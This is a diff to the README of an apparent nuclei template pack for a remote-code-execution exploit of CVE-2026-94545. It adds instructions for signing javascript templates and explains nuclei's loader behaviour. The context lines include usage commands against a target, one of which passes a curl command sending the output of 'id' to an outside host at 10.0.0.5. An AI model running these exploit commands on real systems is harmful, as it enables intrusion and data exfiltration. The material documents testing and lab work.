@@ -33,7 +33,17 @@ shipped with the advisory.
 
 ## Usage
 
+> **Both templates must be signed before nuclei will run them.**`javascript:` templates
+> are refused when unsigned (see [Signing](#signing-is-required) below) — that is nuclei
+> policy, not a template defect. `lab/run-nuclei.sh` does the signing and the runs for you.
+
 ```bash
+# 0) once per machine, and again after every edit of a template file
+nuclei -sign -t CVE-2026-94545.yaml       # on a fresh machine this only generates
+nuclei -sign -t CVE-2026-94545.yaml       # the keypair; the second call writes the signature
+nuclei -sign -t CVE-2026-94545-rce.yaml
+nuclei -sign -t CVE-2026-94545-rce.yaml
+
 # Reachability (safe, run this first)
 nuclei -u https://target.example -t CVE-2026-94545.yaml
 
@@ -43,6 +53,41 @@ nuclei -u https://target.example -t CVE-2026-94545-rce.yaml
 # Exploit with an explicit command (<= 71 bytes) and no Interactsh
 nuclei -u https://target.example -t CVE-2026-94545-rce.yaml -var cmd='curl http://10.0.0.5/x?i=$(id)'
 ```
+
+### Signing is required
+
+nuclei v3 skips unsigned `javascript:`-protocol templates outright, and an unsigned file is
+therefore reported as `no templates provided for scan` even though the loader printed a
+warning about it. The relevant code path is
+`pkg/catalog/loader/loader.go`:
+
+```go
+// javascript-protocol templates expose Go-backed modules through
+// the JS runtime, so unsigned ones are rejected before execution.
+if parsed.IsUnsignedJavascriptTemplate() {
+    stats.Increment(templates.SkippedUnverifiedJavascriptTemplateStats)
+    ...
+    return
+}
+```
+
+The stats line is what you see as
+`[WRN] Found 1 unsigned or tampered javascript template (carefully examine before using it & use -sign flag to sign them)`.
+There is no flag that re-enables unsigned JS templates; `-code` is unrelated (it gates the
+`code:` protocol only, `javascript:` requests are appended unconditionally in
+`pkg/templates/compile.go`).
+
+Signing workflow (`-sign`, ECDSA keypair in `~/.config/nuclei/keys/`, overridable with
+`NUCLEI_USER_CERTIFICATE` / `NUCLEI_USER_PRIVATE_KEY`):
+
+1. `nuclei -sign -t <file>` with no keys present **generates the keypair and exits** —
+   run it a second time to actually sign.
+2. The signature is appended to the YAML as a `# digest: <sig>:<fragment>` line. Any later
+   edit invalidates it and the template goes back to being "unsigned or tampered", so
+   re-sign after every change.
+3. The signature is bound to *your* keypair, so a signed copy only verifies on the machine
+   that signed it. Do not commit signed templates; sign the copy you run
+   (`lab/run-nuclei.sh` signs copies under `lab/.signed/`).
 
 ### Variables
 
@@ -110,7 +155,8 @@ nuclei" in `lab/README.md` for the same checks with the real tool).
 Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
 `nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
 syntax check. No `nuclei -validate` run was possible in this environment (no Go toolchain,
-release downloads blocked) — that is the one gap to close on a machine that has nuclei.
+release downloads blocked), so the first run with the real binary is still worth doing —
+`lab/run-nuclei.sh` handles the signing step that nuclei requires.
 
 ## Notes
 
